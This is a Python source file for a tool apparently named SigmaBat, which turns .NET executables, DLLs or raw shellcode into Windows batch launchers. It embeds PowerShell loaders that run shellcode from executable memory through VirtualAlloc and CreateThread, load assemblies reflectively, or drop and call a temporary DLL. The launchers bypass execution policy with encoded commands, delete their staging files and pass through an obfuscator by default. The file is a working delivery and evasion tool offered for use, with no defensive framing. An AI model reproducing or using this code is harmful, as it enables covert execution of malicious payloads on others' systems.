import base64
import argparse
import struct
import os
import subprocess
import sys
from pathlib import Path


CHUNK_SIZE = 3000

SHELLCODE_LOADER = r"""
$ErrorActionPreference = 'Stop'
$ProgressPreference = 'SilentlyContinue'
$b64 = $env:SIGMABAT_SHELLCODE_B64

if ([string]::IsNullOrWhiteSpace($b64)) {
    throw 'SIGMABAT_SHELLCODE_B64 is empty.'
}

$bytes = [Convert]::FromBase64String($b64)

[Console]::WriteLine("[SigmaBat] shellcode bytes loaded: {0}", $bytes.Length)

Add-Type @"
using System;
using System.Runtime.InteropServices;

public static class NativeMethods
{
    [DllImport("kernel32", SetLastError=true)]
    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, UIntPtr dwSize, uint flAllocationType, uint flProtect);

    [DllImport("kernel32", SetLastError=true)]
    public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, UIntPtr dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out uint lpThreadId);

    [DllImport("kernel32", SetLastError=true)]
    public static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

    [DllImport("kernel32", SetLastError=true)]
    public static extern bool CloseHandle(IntPtr hObject);
}
"@

$size = [UIntPtr]::new([uint64]$bytes.Length)
$mem = [NativeMethods]::VirtualAlloc([IntPtr]::Zero, $size, 0x3000, 0x40)
if ($mem -eq [IntPtr]::Zero) {
    throw 'VirtualAlloc failed.'
}

[System.Runtime.InteropServices.Marshal]::Copy($bytes, 0, $mem, $bytes.Length)

$threadId = 0
$thread = [NativeMethods]::CreateThread([IntPtr]::Zero, [UIntPtr]::Zero, $mem, [IntPtr]::Zero, 0, [ref]$threadId)
if ($thread -eq [IntPtr]::Zero) {
    throw 'CreateThread failed.'
}

[void][NativeMethods]::WaitForSingleObject($thread, 4294967295)
[void][NativeMethods]::CloseHandle($thread)

[Console]::WriteLine("[SigmaBat] shellcode execution completed.")
"""

POWERSHELL_LOADER = r"""
$ErrorActionPreference = 'Stop'
$ProgressPreference = 'SilentlyContinue'
$b64 = $env:SIGMABAT_B64
$symbol = $env:SIGMABAT_SYMBOL
$mode = $env:SIGMABAT_MODE
$b64Path = $null

if ([string]::IsNullOrWhiteSpace($b64)) {
    $b64Path = $env:SIGMABAT_B64_PATH
    if ([string]::IsNullOrWhiteSpace($b64Path)) {
        throw 'SIGMABAT_B64 and SIGMABAT_B64_PATH are empty.'
    }

    $b64 = [regex]::Replace([System.IO.File]::ReadAllText($b64Path), '\s', '')
}

$dllPath = $null
$bytes = [Convert]::FromBase64String($b64)

if ($mode -ne 'managed_exe' -and [string]::IsNullOrWhiteSpace($symbol)) {
    throw 'SIGMABAT_SYMBOL is empty.'
}

$bindingFlags = [System.Reflection.BindingFlags]'Public,NonPublic,Static'

function Invoke-ManagedFunction {
    param(
        [System.Reflection.Assembly]$Assembly,
        [string]$Name
    )

    $candidates = foreach ($type in $Assembly.GetTypes()) {
        $type.GetMethods($bindingFlags) | Where-Object { $_.Name -eq $Name }
    }

    if (-not $candidates) {
        throw "Managed function '$Name' was not found."
    }

    $method = $candidates | Where-Object { $_.GetParameters().Count -eq 0 } | Select-Object -First 1
    if (-not $method) {
        $method = $candidates | Where-Object {
            $params = $_.GetParameters()
            $params.Count -eq 1 -and $params[0].ParameterType -eq [string[]]
        } | Select-Object -First 1
    }

    if (-not $method) {
        throw "Managed function '$Name' exists, but its signature is not supported."
    }

    if ($method.GetParameters().Count -eq 0) {
        [void]$method.Invoke($null, @())
    }
    else {
        [void]$method.Invoke($null, (,([string[]]@())))
    }
}

function Invoke-ManagedEntryPoint {
    param(
        [System.Reflection.Assembly]$Assembly
    )

    $entryPoint = $Assembly.EntryPoint
    if (-not $entryPoint) {
        throw 'Managed assembly has no entry point.'
    }

    $params = $entryPoint.GetParameters()
    if ($params.Count -eq 0) {
        [void]$entryPoint.Invoke($null, @())
        return
    }

    if ($params.Count -eq 1 -and $params[0].ParameterType -eq [string[]]) {
        [void]$entryPoint.Invoke($null, (,([string[]]@())))
        return
    }

    throw 'Managed entry point signature is not supported.'
}

function Invoke-NativeFunction {
    param(
        [byte[]]$Bytes,
        [string]$Name
    )

    $tempFile = [System.IO.Path]::Combine([System.IO.Path]::GetTempPath(), [System.IO.Path]::GetRandomFileName() + '.dll')
    [System.IO.File]::WriteAllBytes($tempFile, $Bytes)
    $dllPath = $tempFile

    Add-Type @"
using System;
using System.Runtime.InteropServices;

public static class NativeMethods
{
    [DllImport("kernel32", SetLastError=true, CharSet=CharSet.Unicode)]
    public static extern IntPtr LoadLibrary(string lpFileName);

    [DllImport("kernel32", SetLastError=true, CharSet=CharSet.Ansi)]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

    [DllImport("kernel32", SetLastError=true)]
    public static extern bool FreeLibrary(IntPtr hModule);
}

[UnmanagedFunctionPointer(CallingConvention.Winapi)]
public delegate IntPtr NativeNoArgsDelegate();
"@

    try {
        $module = [NativeMethods]::LoadLibrary($dllPath)
        if ($module -eq [IntPtr]::Zero) {
            throw "Failed to load native DLL."
        }

        $proc = [NativeMethods]::GetProcAddress($module, $Name)
        if ($proc -eq [IntPtr]::Zero) {
            throw "Native export '$Name' was not found."
        }

        $fn = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
            $proc,
            [NativeNoArgsDelegate]
        )
        [void]$fn.Invoke()
    }
    finally {
        if ($dllPath -and [System.IO.File]::Exists($dllPath)) {
            Remove-Item -LiteralPath $dllPath -Force -ErrorAction SilentlyContinue
        }
    }
}

switch ($mode) {
    'managed' {
        $assembly = [System.Reflection.Assembly]::Load($bytes)
        Invoke-ManagedFunction -Assembly $assembly -Name $symbol
    }
    'managed_exe' {
        $assembly = [System.Reflection.Assembly]::Load($bytes)
        Invoke-ManagedEntryPoint -Assembly $assembly
    }
    'native' {
        Invoke-NativeFunction -Bytes $bytes -Name $symbol
    }
    default {
        throw "Unknown DLL mode: $mode"
    }
}

if ($b64Path -and [System.IO.File]::Exists($b64Path)) {
    Remove-Item -LiteralPath $b64Path -Force -ErrorAction SilentlyContinue
}
"""


def chunk_string(value, size):
    for offset in range(0, len(value), size):
        yield value[offset:offset + size]


def encode_powershell_script(script_text):
    return base64.b64encode(script_text.encode("utf-16le")).decode("ascii")


def escape_batch_value(value):
    escaped = value.replace("^", "^^")
    escaped = escaped.replace("&", "^&")
    escaped = escaped.replace("|", "^|")
    escaped = escaped.replace("<", "^<")
    escaped = escaped.replace(">", "^>")
    escaped = escaped.replace("!", "^!")
    escaped = escaped.replace("%", "%%")
    return escaped


def build_dll_batch_launcher(payload_b64, symbol_name, mode):
    powershell_b64 = encode_powershell_script(POWERSHELL_LOADER.strip())
    use_env_staging = len(payload_b64) <= 6000
    lines = [
        "@echo off",
        "setlocal EnableExtensions DisableDelayedExpansion",
        f"set \"SIGMABAT_SYMBOL={escape_batch_value(symbol_name)}\"",
        f"set \"SIGMABAT_MODE={escape_batch_value(mode)}\"",
    ]

    if use_env_staging:
        lines.append("set \"SIGMABAT_B64=\"")
        for chunk in chunk_string(payload_b64, CHUNK_SIZE):
            lines.append(f'set "SIGMABAT_B64=%SIGMABAT_B64%{chunk}"')
    else:
        batch_file_name = "sigmabat_%RANDOM%%RANDOM%.b64"
        lines.append("set \"SIGMABAT_B64_PATH=%temp%\\" + batch_file_name + "\"")
        lines.append('type nul > "%SIGMABAT_B64_PATH%"')
        for chunk in chunk_string(payload_b64, CHUNK_SIZE):
            lines.append(f'>>"%SIGMABAT_B64_PATH%" echo {chunk}')

    lines.extend([
        f"powershell.exe -NoLogo -NoProfile -NonInteractive -ExecutionPolicy Bypass -EncodedCommand {powershell_b64}",
        "if errorlevel 1 exit /b %errorlevel%",
        "endlocal",
        "",
    ])

    return "\r\n".join(lines)


def build_managed_exe_batch_launcher(payload_b64):
    return build_dll_batch_launcher(payload_b64, "", "managed_exe")


def build_shellcode_batch_launcher(payload_b64):
    powershell_b64 = encode_powershell_script(SHELLCODE_LOADER.strip())
    lines = [
        "@echo off",
        "setlocal EnableExtensions DisableDelayedExpansion",
        "set \"SIGMABAT_SHELLCODE_B64=\"",
        "echo [SigmaBat] shellcode launcher starting...",
    ]

    for chunk in chunk_string(payload_b64, CHUNK_SIZE):
        lines.append(f'set "SIGMABAT_SHELLCODE_B64=%SIGMABAT_SHELLCODE_B64%{chunk}"')

    lines.extend([
        f"powershell.exe -NoLogo -NoProfile -NonInteractive -ExecutionPolicy Bypass -EncodedCommand {powershell_b64}",
        "if errorlevel 1 exit /b %errorlevel%",
        "echo [SigmaBat] shellcode launcher finished.",
        "endlocal",
        "",
    ])

    return "\r\n".join(lines)


def run_obfuscator(output_path):
    obfuscator_path = Path(__file__).with_name("obfuscator.py")

    if not obfuscator_path.is_file():
        raise FileNotFoundError(f"Missing obfuscator: {obfuscator_path}")

    subprocess.run(
        [sys.executable, str(obfuscator_path), str(output_path)],
        check=True,
        capture_output=True,
        text=True,
    )


def is_managed_dotnet(input_path):
    probe = (
        "$p = $env:SIGMABAT_TARGET; "
        "try { [void][System.Reflection.AssemblyName]::GetAssemblyName($p); exit 0 } "
        "catch { exit 1 }"
    )
    env = dict(os.environ)
    env["SIGMABAT_TARGET"] = str(input_path.resolve())
    result = subprocess.run(
        [
            "powershell.exe",
            "-NoLogo",
            "-NoProfile",
            "-ExecutionPolicy",
            "Bypass",
            "-Command",
            probe,
        ],
        env=env,
        capture_output=True,
        text=True,
    )
    return result.returncode == 0


def has_managed_symbol(input_path, symbol_name):
    probe = (
        "$p = $env:SIGMABAT_TARGET; "
        "$name = $env:SIGMABAT_SYMBOL; "
        "$binding = [System.Reflection.BindingFlags]'Public,NonPublic,Static'; "
        "try { "
        "$assembly = [System.Reflection.Assembly]::LoadFile($p); "
        "$found = $false; "
        "foreach ($type in $assembly.GetTypes()) { "
        "foreach ($method in $type.GetMethods($binding)) { "
        "if ($method.Name -eq $name) { "
        "$params = $method.GetParameters(); "
        "if ($params.Count -eq 0 -or ($params.Count -eq 1 -and $params[0].ParameterType -eq [string[]])) { $found = $true; break }"
        "}"
        "}"
        "if ($found) { break }"
        "}"
        "if ($found) { exit 0 } else { exit 1 } "
        "} catch { exit 1 }"
    )
    env = dict(os.environ)
    env["SIGMABAT_TARGET"] = str(input_path.resolve())
    env["SIGMABAT_SYMBOL"] = symbol_name
    result = subprocess.run(
        [
            "powershell.exe",
            "-NoLogo",
            "-NoProfile",
            "-ExecutionPolicy",
            "Bypass",
            "-Command",
            probe,
        ],
        env=env,
        capture_output=True,
        text=True,
    )
    return result.returncode == 0


def has_managed_entrypoint(input_path):
    probe = (
        "$p = $env:SIGMABAT_TARGET; "
        "try { "
        "$assembly = [System.Reflection.Assembly]::LoadFile($p); "
        "if ($assembly.EntryPoint) { exit 0 } else { exit 1 } "
        "} catch { exit 1 }"
    )
    env = dict(os.environ)
    env["SIGMABAT_TARGET"] = str(input_path.resolve())
    result = subprocess.run(
        [
            "powershell.exe",
            "-NoLogo",
            "-NoProfile",
            "-ExecutionPolicy",
            "Bypass",
            "-Command",
            probe,
        ],
        env=env,
        capture_output=True,
        text=True,
    )
    return result.returncode == 0


def rva_to_offset(rva, sections):
    for section in sections:
        start = section["virtual_address"]
        size = max(section["virtual_size"], section["raw_size"])
        end = start + size
        if start <= rva < end:
            return rva - start + section["raw_address"]
    raise ValueError("RVA out of range")


def get_native_exports(input_path):
    data = input_path.read_bytes()
    if len(data) < 0x100:
        return set()
    if data[:2] != b"MZ":
        return set()

    pe_offset = struct.unpack_from("<I", data, 0x3C)[0]
    if pe_offset + 0x18 > len(data) or data[pe_offset:pe_offset + 4] != b"PE\x00\x00":
        return set()

    number_of_sections = struct.unpack_from("<H", data, pe_offset + 6)[0]
    size_of_optional_header = struct.unpack_from("<H", data, pe_offset + 20)[0]
    optional_offset = pe_offset + 24
    magic = struct.unpack_from("<H", data, optional_offset)[0]
    if magic == 0x10B:
        data_directory_offset = optional_offset + 96
    elif magic == 0x20B:
        data_directory_offset = optional_offset + 112
    else:
        return set()

    export_rva, export_size = struct.unpack_from("<II", data, data_directory_offset)
    if export_rva == 0 or export_size == 0:
        return set()

    section_offset = optional_offset + size_of_optional_header
    sections = []
    for index in range(number_of_sections):
        entry_offset = section_offset + (40 * index)
        virtual_size = struct.unpack_from("<I", data, entry_offset + 8)[0]
        virtual_address = struct.unpack_from("<I", data, entry_offset + 12)[0]
        raw_size = struct.unpack_from("<I", data, entry_offset + 16)[0]
        raw_address = struct.unpack_from("<I", data, entry_offset + 20)[0]
        sections.append(
            {
                "virtual_size": virtual_size,
                "virtual_address": virtual_address,
                "raw_size": raw_size,
                "raw_address": raw_address,
            }
        )

    export_offset = rva_to_offset(export_rva, sections)
    if export_offset + 40 > len(data):
        return set()

    number_of_names = struct.unpack_from("<I", data, export_offset + 24)[0]
    address_of_names = struct.unpack_from("<I", data, export_offset + 32)[0]

    exports = set()
    for index in range(number_of_names):
        name_rva_offset = rva_to_offset(address_of_names + (4 * index), sections)
        name_rva = struct.unpack_from("<I", data, name_rva_offset)[0]
        name_offset = rva_to_offset(name_rva, sections)

        end = data.find(b"\x00", name_offset)
        if end == -1:
            continue
        try:
            exports.add(data[name_offset:end].decode("ascii"))
        except UnicodeDecodeError:
            continue

    return exports


def resolve_input_mode_and_symbol(input_path, symbol_name):
    if is_managed_dotnet(input_path):
        if input_path.suffix.lower() == ".exe" and not symbol_name:
            if not has_managed_entrypoint(input_path):
                print(f"Managed entry point not found: {input_path}")
                sys.exit(1)
            return "managed_exe"

        if not symbol_name:
            print("Symbol name is required for managed DLL inputs.")
            sys.exit(1)

        if not has_managed_symbol(input_path, symbol_name):
            print(f"Managed function not found: {symbol_name}")
            sys.exit(1)
        return "managed"

    exports = get_native_exports(input_path)
    if symbol_name not in exports:
        print(f"Native export not found: {symbol_name}")
        sys.exit(1)
    return "native"


def build_dll_launcher(input_path, symbol_name, output_path, no_obf):
    mode = resolve_input_mode_and_symbol(input_path, symbol_name)
    payload_bytes = input_path.read_bytes()
    payload_b64 = base64.b64encode(payload_bytes).decode("ascii")
    batch_text = build_dll_batch_launcher(payload_b64, symbol_name, mode)
    output_path.write_text(batch_text, encoding="utf-8", newline="\r\n")

    if not no_obf:
        try:
            run_obfuscator(output_path)
        except subprocess.CalledProcessError as exc:
            stderr = exc.stderr.strip() if exc.stderr else ""
            stdout = exc.stdout.strip() if exc.stdout else ""
            detail = stderr or stdout or str(exc)
            print(f"Obfuscation failed: {detail}")
            sys.exit(1)
        except FileNotFoundError as exc:
            print(str(exc))
            sys.exit(1)

    mode_text = "without obfuscation" if no_obf else "with obfuscation"
    print(f"Created launcher ({mode_text}): {output_path}")


def build_managed_exe_launcher(input_path, output_path, no_obf):
    if not is_managed_dotnet(input_path):
        print(f"Not a managed .NET assembly: {input_path}")
        sys.exit(1)

    if not has_managed_entrypoint(input_path):
        print(f"Managed entry point not found: {input_path}")
        sys.exit(1)

    payload_bytes = input_path.read_bytes()
    payload_b64 = base64.b64encode(payload_bytes).decode("ascii")
    batch_text = build_managed_exe_batch_launcher(payload_b64)
    output_path.write_text(batch_text, encoding="utf-8", newline="\r\n")

    if not no_obf:
        try:
            run_obfuscator(output_path)
        except subprocess.CalledProcessError as exc:
            stderr = exc.stderr.strip() if exc.stderr else ""
            stdout = exc.stdout.strip() if exc.stdout else ""
            detail = stderr or stdout or str(exc)
            print(f"Obfuscation failed: {detail}")
            sys.exit(1)
        except FileNotFoundError as exc:
            print(str(exc))
            sys.exit(1)

    mode_text = "without obfuscation" if no_obf else "with obfuscation"
    print(f"Created managed EXE launcher ({mode_text}): {output_path}")


def build_shellcode_launcher(input_path, output_path, no_obf):
    if input_path.stat().st_size == 0:
        print(f"Empty shellcode input: {input_path}")
        sys.exit(1)

    payload_bytes = input_path.read_bytes()
    payload_b64 = base64.b64encode(payload_bytes).decode("ascii")
    batch_text = build_shellcode_batch_launcher(payload_b64)
    output_path.write_text(batch_text, encoding="utf-8", newline="\r\n")

    if not no_obf:
        try:
            run_obfuscator(output_path)
        except subprocess.CalledProcessError as exc:
            stderr = exc.stderr.strip() if exc.stderr else ""
            stdout = exc.stdout.strip() if exc.stdout else ""
            detail = stderr or stdout or str(exc)
            print(f"Obfuscation failed: {detail}")
            sys.exit(1)
        except FileNotFoundError as exc:
            print(str(exc))
            sys.exit(1)

    mode_text = "without obfuscation" if no_obf else "with obfuscation"
    print(f"Created shellcode launcher ({mode_text}): {output_path}")


def main():
    parser = argparse.ArgumentParser(
        description="Generate batch launchers for managed EXEs, DLLs, or raw shellcode."
    )
    common = argparse.ArgumentParser(add_help=False)
    common.add_argument(
        "--no-obf",
        action="store_true",
        help="Skip the post-processing obfuscation step",
    )

    subparsers = parser.add_subparsers(dest="command", required=True)
    exe_parser = subparsers.add_parser("exe", parents=[common], help="Generate a launcher for a managed EXE")
    exe_parser.add_argument("input_exe", help="Path to the input EXE")
    exe_parser.add_argument("output_bat", help="Path to the output .bat file")

    dll_parser = subparsers.add_parser("dll", parents=[common], help="Generate a launcher for a DLL")
    dll_parser.add_argument("input_dll", help="Path to the input DLL")
    dll_parser.add_argument("symbol_name", help="Managed method or native export name")
    dll_parser.add_argument("output_bat", help="Path to the output .bat file")

    shellcode_parser = subparsers.add_parser("shellcode", parents=[common], help="Generate a launcher for raw shellcode")
    shellcode_parser.add_argument("input_shellcode", help="Path to the shellcode blob")
    shellcode_parser.add_argument("output_bat", help="Path to the output .bat file")

    args = parser.parse_args()

    if args.command == "exe":
        input_path = Path(args.input_exe)
        output_path = Path(args.output_bat)

        if not input_path.is_file():
            print(f"File not found: {input_path}")
            sys.exit(1)

        if input_path.suffix.lower() != ".exe":
            print(f"Unsupported input type: {input_path}")
            sys.exit(1)

        build_managed_exe_launcher(input_path, output_path, args.no_obf)
        return

    if args.command == "dll":
        input_path = Path(args.input_dll)
        output_path = Path(args.output_bat)

        if not input_path.is_file():
            print(f"File not found: {input_path}")
            sys.exit(1)

        if input_path.suffix.lower() != ".dll":
            print(f"Unsupported input type: {input_path}")
            sys.exit(1)

        build_dll_launcher(input_path, args.symbol_name, output_path, args.no_obf)
        return

    if args.command == "shellcode":
        input_path = Path(args.input_shellcode)
        output_path = Path(args.output_bat)

        if not input_path.is_file():
            print(f"File not found: {input_path}")
            sys.exit(1)

        build_shellcode_launcher(input_path, output_path, args.no_obf)
        return


if __name__ == "__main__":
    main()
